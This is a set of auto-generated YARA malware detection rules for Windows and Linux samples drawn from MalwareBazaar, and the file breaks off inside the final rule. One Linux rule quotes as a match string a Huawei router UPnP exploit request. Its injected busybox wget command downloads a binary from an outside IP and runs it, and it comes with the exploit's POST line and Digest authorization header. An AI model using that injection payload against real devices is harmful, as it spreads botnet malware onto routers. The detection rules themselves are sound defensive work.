rule Windows_03a8af6de09ff99b87a9757a8823d17801b4261f93c3d53e71283089d4a0c4bd
{
    meta:
        description = "Auto ML: 03a8af6de09ff99b87a9757a8823d17801b4261f93c3d53e71283089d4a0c4bd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 366KB
        and all of them
}

rule Windows_30205eaf6f581036262bfc099dfc5cc5d0e4d771dca3d1c4cf3dada59d097672
{
    meta:
        description = "Auto ML: 30205eaf6f581036262bfc099dfc5cc5d0e4d771dca3d1c4cf3dada59d097672"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "SVWuH3"
        $s5 = "uBhb4@"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 241KB
        and all of them
}

rule Linux_302d47a448b2f83f5cfc73f9c08625da04a45978266504082ca72d06ff506da3
{
    meta:
        description = "Auto ML: 302d47a448b2f83f5cfc73f9c08625da04a45978266504082ca72d06ff506da3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "9D$$tyPPj"
        $s2 = "D$LPj\""
        $s3 = "xT;,$wOtG"
        $s4 = "D$$PSV"
        $s5 = "D$@;D$Du"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 74KB
        and all of them
}

rule Windows_30352cfbcc257fe2f2ed508076a95f1d2dbf00d0953727e7a2a81b7d450cc1a1
{
    meta:
        description = "Auto ML: 30352cfbcc257fe2f2ed508076a95f1d2dbf00d0953727e7a2a81b7d450cc1a1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Nullable`1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 819KB
        and all of them
}

rule Windows_304e790ea457aa80cdfdaa00e9715f33b97250d962ccbde98cf2515f87f45959
{
    meta:
        description = "Auto ML: 304e790ea457aa80cdfdaa00e9715f33b97250d962ccbde98cf2515f87f45959"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".ndata"
        $s5 = "Instu`"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 82449KB
        and all of them
}

rule Windows_3054cb557781a24975e1da913001c39614b179c6756a27a3c8bf870f157f7444
{
    meta:
        description = "Auto ML: 3054cb557781a24975e1da913001c39614b179c6756a27a3c8bf870f157f7444"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.text"
        $s3 = "`.data"
        $s4 = "memset"
        $s5 = "CRTDLL.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 85KB
        and all of them
}

rule Windows_30960eccc60a538b6c7038d01c60fded8b4a997641653ee16efa2bd299c48b96
{
    meta:
        description = "Auto ML: 30960eccc60a538b6c7038d01c60fded8b4a997641653ee16efa2bd299c48b96"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Install, Setup or Update"
        $s5 = "CoolerBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Linux_30b4a5d4e349ee41deea619128797af9ba4149e6ea1256ed7a9dc2a183fd3965
{
    meta:
        description = "Auto ML: 30b4a5d4e349ee41deea619128797af9ba4149e6ea1256ed7a9dc2a183fd3965"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ID8tR}"
        $s2 = "y8Mf(k{I"
        $s3 = "sx#$'nA"
        $s4 = "eQ} Az"
        $s5 = "jm?0>gFe"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 44KB
        and all of them
}

rule Windows_30ce264ab2bfdf9b1b2b59f6e3f2a13364b68b83d9785aaf16d9482f262c6078
{
    meta:
        description = "Auto ML: 30ce264ab2bfdf9b1b2b59f6e3f2a13364b68b83d9785aaf16d9482f262c6078"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".sxdata"
        $s5 = "PSSSSSS"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7466KB
        and all of them
}

rule Windows_30edfb9a936a7c0be6e8a97732bab72ec1bcc2d4bba4d8bef301ae944c8de7c2
{
    meta:
        description = "Auto ML: 30edfb9a936a7c0be6e8a97732bab72ec1bcc2d4bba4d8bef301ae944c8de7c2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<submit_button_Click>b__12_0"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 635KB
        and all of them
}

rule Windows_317733d3aa747780789dc33fab225524789c233856815d6da5f0e819454e30a8
{
    meta:
        description = "Auto ML: 317733d3aa747780789dc33fab225524789c233856815d6da5f0e819454e30a8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Rich~v"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5908KB
        and all of them
}

rule Windows_03c775dde6ce601d449b564ec7243880d79dd2853308931c57a3e69a912efaf6
{
    meta:
        description = "Auto ML: 03c775dde6ce601d449b564ec7243880d79dd2853308931c57a3e69a912efaf6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "RichlY"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "0WWWWW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 339KB
        and all of them
}

rule Windows_3187b0afed12d7d408ed397bd025fc13c46d627eacc94e20438a4bd0078e4f57
{
    meta:
        description = "Auto ML: 3187b0afed12d7d408ed397bd025fc13c46d627eacc94e20438a4bd0078e4f57"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "-7+@+A+F+G+L+"
        $s5 = "+C+D+E+J"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 751KB
        and all of them
}

rule Linux_3193adec6dd8578bf47a67996127add2efe465f03d4645e96c6d1e86647d7a8b
{
    meta:
        description = "Auto ML: 3193adec6dd8578bf47a67996127add2efe465f03d4645e96c6d1e86647d7a8b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 152KB
        and all of them
}

rule Windows_31b26582627d2978052cdce87ae338c2e78a029f7676365e1583c05528afada0
{
    meta:
        description = "Auto ML: 31b26582627d2978052cdce87ae338c2e78a029f7676365e1583c05528afada0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "YrvVrpoJl1"
        $s3 = "`.rsrc"
        $s4 = "`.reloc"
        $s5 = "Ur`JmD"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 425KB
        and all of them
}

rule Windows_31fb4e3de00fdb16562c1b03088df5245e45a49fb3646c90f1e5df0e9bc0acd0
{
    meta:
        description = "Auto ML: 31fb4e3de00fdb16562c1b03088df5245e45a49fb3646c90f1e5df0e9bc0acd0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".didat"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1654KB
        and all of them
}

rule Windows_31ffe7c6379350a8abd75e69736fd081a58641823c4a6bf6d55fda547f360b72
{
    meta:
        description = "Auto ML: 31ffe7c6379350a8abd75e69736fd081a58641823c4a6bf6d55fda547f360b72"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".didat"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1302KB
        and all of them
}

rule Windows_320eb4a230a455a9d7b58051aa6ebf9a969347db6c33e92634bca94422ab2b99
{
    meta:
        description = "Auto ML: 320eb4a230a455a9d7b58051aa6ebf9a969347db6c33e92634bca94422ab2b99"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6289KB
        and all of them
}

rule Windows_320f473e994fdb11ab78274c29f46373fb9beee06fc6d36c4ae088f2205d4339
{
    meta:
        description = "Auto ML: 320f473e994fdb11ab78274c29f46373fb9beee06fc6d36c4ae088f2205d4339"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1992KB
        and all of them
}

rule Windows_323d242e0f3fd2288e5f4e13d64a9bbd91af3bb64b9ada1522ab6a4ca44cfc8c
{
    meta:
        description = "Auto ML: 323d242e0f3fd2288e5f4e13d64a9bbd91af3bb64b9ada1522ab6a4ca44cfc8c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "mation"
        $s5 = "ucProgressBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1386KB
        and all of them
}

rule Linux_325c90abb31eb7cabeca837414f9289a3de1f9abdb715072b22512544a4855ed
{
    meta:
        description = "Auto ML: 325c90abb31eb7cabeca837414f9289a3de1f9abdb715072b22512544a4855ed"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 185.224.128.187 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>"
        $s2 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s3 = "Connection: keep-alive"
        $s4 = "Accept: */*"
        $s5 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\""

    condition:
        uint32(0) == 0x464c457f and
        filesize < 182KB
        and all of them
}

rule Windows_326a9bc3c325f725854d0ec9dac466084a332cb1d5c13b48938f767b3d0c8c33
{
    meta:
        description = "Auto ML: 326a9bc3c325f725854d0ec9dac466084a332cb1d5c13b48938f767b3d0c8c33"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "IEnumerable`1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 624KB
        and all of them
}

rule Windows_03d64134db5f0c1296f16f64b8ef153fe5096753cb6654de01eaa74e988247dd
{
    meta:
        description = "Auto ML: 03d64134db5f0c1296f16f64b8ef153fe5096753cb6654de01eaa74e988247dd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".ndata"
        $s5 = "SQSSSPW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 370KB
        and all of them
}

rule Windows_326f39b2d29896b3748625b4bab991da83ce7583b35dc0ed984455c77f24057b
{
    meta:
        description = "Auto ML: 326f39b2d29896b3748625b4bab991da83ce7583b35dc0ed984455c77f24057b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "label10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 801KB
        and all of them
}

rule Linux_32a5c3d673316ed7cca78cbf3bcd9c371510edd426436126700598cf1e3a9d32
{
    meta:
        description = "Auto ML: 32a5c3d673316ed7cca78cbf3bcd9c371510edd426436126700598cf1e3a9d32"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N^NuNV"
        $s2 = ";hN^NuNV"
        $s3 = "OHWHQHy"
        $s4 = "/BQxHoQxB"
        $s5 = "HoPpHoP"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 72KB
        and all of them
}

rule Windows_32aa4355cbed96bc5f95b9e18425fcfa9e3191007e13e2e6764eb8355f276c8d
{
    meta:
        description = "Auto ML: 32aa4355cbed96bc5f95b9e18425fcfa9e3191007e13e2e6764eb8355f276c8d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!UUUUUUUU"
        $s5 = "hXhS+^"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB
        and all of them
}

rule Linux_32d24b688b96c95fe5257e96df516d4fd8e5dc95c8749ff03410186f951156e4
{
    meta:
        description = "Auto ML: 32d24b688b96c95fe5257e96df516d4fd8e5dc95c8749ff03410186f951156e4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/lib/ld-uClibc.so.0"
        $s2 = "memcpy"
        $s3 = "libc.so.0"
        $s4 = "strcpy"
        $s5 = "vsprintf"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 50KB
        and all of them
}

rule Windows_32e9ea89c598100f7702064c015b2a86ebcc2f3c6c76aba434a63d66a1ca2421
{
    meta:
        description = "Auto ML: 32e9ea89c598100f7702064c015b2a86ebcc2f3c6c76aba434a63d66a1ca2421"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6881KB
        and all of them
}

rule Windows_330aea213247a491354b799ace1111e9436822ec668557e02d0d75e9e7ac1544
{
    meta:
        description = "Auto ML: 330aea213247a491354b799ace1111e9436822ec668557e02d0d75e9e7ac1544"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!Win32 .EXE."
        $s2 = ".MPRESS1"
        $s3 = ".MPRESS2"
        $s4 = "#uhRFS"
        $s5 = "aR*[UZ"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 145KB
        and all of them
}

rule Windows_3370a17c962918d5ae4273b85dc7116750882719a7cb440df9ae75bac995dc36
{
    meta:
        description = "Auto ML: 3370a17c962918d5ae4273b85dc7116750882719a7cb440df9ae75bac995dc36"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = "`.rdata"
        $s3 = "`PRWQW"
        $s4 = "XPWVQW"
        $s5 = "`iG_ jE"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 305KB
        and all of them
}

rule Windows_338a704200c126ca6aa4c666bacf257544fe5e1fa10420116b4976de9985d13e
{
    meta:
        description = "Auto ML: 338a704200c126ca6aa4c666bacf257544fe5e1fa10420116b4976de9985d13e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = "`.itext"
        $s3 = "`.data"
        $s4 = ".didata"
        $s5 = ".edata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 8837KB
        and all of them
}

rule Windows_33b845f4977885ba03d8de6bc260847dd0ec6dc9489a2da3071701b160a1ddec
{
    meta:
        description = "Auto ML: 33b845f4977885ba03d8de6bc260847dd0ec6dc9489a2da3071701b160a1ddec"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "(UfUG("
        $s5 = "(AzdM~S"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 331KB
        and all of them
}

rule Windows_33d4fd69c03968b472e3b5ec2fdf43db754aeed4366ae0111ac97fd394ef1e45
{
    meta:
        description = "Auto ML: 33d4fd69c03968b472e3b5ec2fdf43db754aeed4366ae0111ac97fd394ef1e45"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#ffffff"
        $s5 = "#Strings"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 518KB
        and all of them
}

rule Linux_03fe0c73c91771b3677baf7236a57b27388a7f74caa39845a048f7ba8524078b
{
    meta:
        description = "Auto ML: 03fe0c73c91771b3677baf7236a57b27388a7f74caa39845a048f7ba8524078b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Content-Length: 430"
        $s3 = "Connection: keep-alive"
        $s4 = "Accept: */*"
        $s5 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\""

    condition:
        uint32(0) == 0x464c457f and
        filesize < 79KB
        and all of them
}

rule Windows_33e2197c8f024767830350d957a058e21d21b14574d846b88bc1bae507fc5933
{
    meta:
        description = "Auto ML: 33e2197c8f024767830350d957a058e21d21b14574d846b88bc1bae507fc5933"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<>c__DisplayClass0_0"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 984KB
        and all of them
}

rule Linux_33f83de3b8d1ce29956b6e993566886843343408a2601f637a53e9a6310a8155
{
    meta:
        description = "Auto ML: 33f83de3b8d1ce29956b6e993566886843343408a2601f637a53e9a6310a8155"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"
        $s3 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s4 = "/proc/net/route"
        $s5 = "(null)"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 92KB
        and all of them
}

rule Windows_341372559158cab79996c90dcd211afda0873d901a0519cc5cbb2e68f52ff410
{
    meta:
        description = "Auto ML: 341372559158cab79996c90dcd211afda0873d901a0519cc5cbb2e68f52ff410"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "`.rdata"
        $s2 = "kernel32.dll"
        $s3 = "GetModuleHandleA"
        $s4 = "user32.dll"
        $s5 = "DefWindowProcW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7653KB
        and all of them
}

rule Windows_34651d44c15017bddd3fe67dfade46637267be4f3ec660797432f0e23f9b7fab
{
    meta:
        description = "Auto ML: 34651d44c15017bddd3fe67dfade46637267be4f3ec660797432f0e23f9b7fab"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5088KB
        and all of them
}

rule Windows_3477199ac35c44688a69664eb2d722607cff4e3a376a2d066eace87fe016debc
{
    meta:
        description = "Auto ML: 3477199ac35c44688a69664eb2d722607cff4e3a376a2d066eace87fe016debc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Rich<>"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".didat"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3732KB
        and all of them
}

rule Linux_3480dbc094726ddfe50b81b2afcc03c66c14b0fb8037065224936bd1c5a6af56
{
    meta:
        description = "Auto ML: 3480dbc094726ddfe50b81b2afcc03c66c14b0fb8037065224936bd1c5a6af56"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "RL8*GC"
        $s2 = "4w?BtJ"
        $s3 = "Z)rjv("
        $s4 = "Cu:<Cx^"
        $s5 = "d`mo@l"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 8KB
        and all of them
}

rule Windows_349f7e00ee29b349b00c32318cb9b829b162167702957295712d37ebbb2a7a9a
{
    meta:
        description = "Auto ML: 349f7e00ee29b349b00c32318cb9b829b162167702957295712d37ebbb2a7a9a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "WVVVVh"
        $s5 = "Yt#9^tu"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 723KB
        and all of them
}

rule Windows_34a4f512d7c7e37fc580abdc8ca4cce21280e4c33e14c0ca48a0d7aee9fc7db9
{
    meta:
        description = "Auto ML: 34a4f512d7c7e37fc580abdc8ca4cce21280e4c33e14c0ca48a0d7aee9fc7db9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = "`.itext"
        $s3 = "`.data"
        $s4 = ".didata"
        $s5 = ".edata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 11324KB
        and all of them
}

rule Windows_34e44036ffb7d1681428bafb62a28fa844dbcb7fad9c79fda98a20f25de94112
{
    meta:
        description = "Auto ML: 34e44036ffb7d1681428bafb62a28fa844dbcb7fad9c79fda98a20f25de94112"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "P`.data"
        $s3 = ".rdata"
        $s4 = "`@.pdata"
        $s5 = "0@.xdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 19KB
        and all of them
}

rule Windows_351fadc9f1ddd2bd6bd34ceed2353b8211123e057b52c6aeb60a28643d92f137
{
    meta:
        description = "Auto ML: 351fadc9f1ddd2bd6bd34ceed2353b8211123e057b52c6aeb60a28643d92f137"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.sdata"
        $s3 = "@.reloc"
        $s4 = "X[lXi}4"
        $s5 = "R@Z#ffffff9@["

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5344KB
        and all of them
}

rule Windows_043aa637e4f804322c03ccdccb3f5030c3009b3f3f3da2a6506163007e123674
{
    meta:
        description = "Auto ML: 043aa637e4f804322c03ccdccb3f5030c3009b3f3f3da2a6506163007e123674"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "ZRichGo"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".pdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 9598KB
        and all of them
}

rule Windows_356019c5f0ab89bcaff1639b2b2a427d7777fcfa13c09f889ef5ea8eb1c031c7
{
    meta:
        description = "Auto ML: 356019c5f0ab89bcaff1639b2b2a427d7777fcfa13c09f889ef5ea8eb1c031c7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "SVWu:ff"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1662KB
        and all of them
}

rule Windows_359834dcc2af3dcbdccb1c13f186c74179a998fe02cbc02afce017c69f717351
{
    meta:
        description = "Auto ML: 359834dcc2af3dcbdccb1c13f186c74179a998fe02cbc02afce017c69f717351"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "IEnumerable`1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 695KB
